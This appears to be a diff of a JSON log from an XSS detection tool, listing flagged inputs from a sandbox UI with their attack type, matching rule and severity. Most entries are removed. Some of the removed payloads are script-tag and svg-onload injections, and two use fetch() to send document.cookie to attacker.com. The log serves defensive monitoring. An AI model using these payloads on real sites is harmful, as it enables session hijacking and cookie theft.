@@ -1,64 +1,11 @@
 [
   {
-    "time": "11:02:31",
-    "summary": "<script>alert(1)</script>",
-    "severity": "Medium",
+    "id": 1,
+    "time": "2026-10-01 04:14:11",
+    "summary": "<script>alert(document.cookie)</script>",
     "attack_type": "Script tag injection",
-    "reason": "rule:script_tag"
-  },
-  {
-    "time": "11:02:47",
-    "summary": "<svg onload=alert(1)>",
+    "reason": "rule:script_tag",
     "severity": "Medium",
-    "attack_type": "Event handler injection",
-    "reason": "rule:event_handler,svg_or_img_vector"
-  },
-  {
-    "time": "19:10:37",
-    "summary": "<script>alert(1)</script>",
-    "attack_type": "Script Tag Injection",
-    "reason": "rule:script_tag",
-    "severity": "Medium"
-  },
-  {
-    "time": "19:12:22",
-    "summary": "<script>fetch(\"http://attacker.com?c=\" + document.cookie)</script>",
-    "attack_type": "Script Tag Injection",
-    "reason": "rule:script_tag",
-    "severity": "High"
-  },
-  {
-    "time": "19:13:07",
-    "summary": "<svg onload=alert(1)>",
-    "attack_type": "Event Handler Injection",
-    "reason": "rule:event_handler",
-    "severity": "Medium"
-  },
-  {
-    "id": 6,
-    "time": "2026-09-30 19:25:27",
-    "summary": "<script>alert(document.cookie)</script>",
-    "attack_type": "Script Tag Injection",
-    "reason": "rule:script_tag",
-    "severity": "High",
-    "source_id": "sandbox-ui"
-  },
-  {
-    "id": 7,
-    "time": "2026-09-30 19:25:31",
-    "summary": "<script>alert(document.cookie)</script>",
-    "attack_type": "Script Tag Injection",
-    "reason": "rule:script_tag",
-    "severity": "High",
-    "source_id": "sandbox-ui"
-  },
-  {
-    "id": 8,
-    "time": "2026-10-01 03:31:41",
-    "summary": "<script>fetch('[http://attacker.com/steal?cookie=](http://attacker.com/steal?cookie=)' + document.cookie)</script>",
-    "attack_type": "Script Tag Injection",
-    "reason": "rule:script_tag",
-    "severity": "High",
     "source_id": "sandbox-ui"
   }
 ]
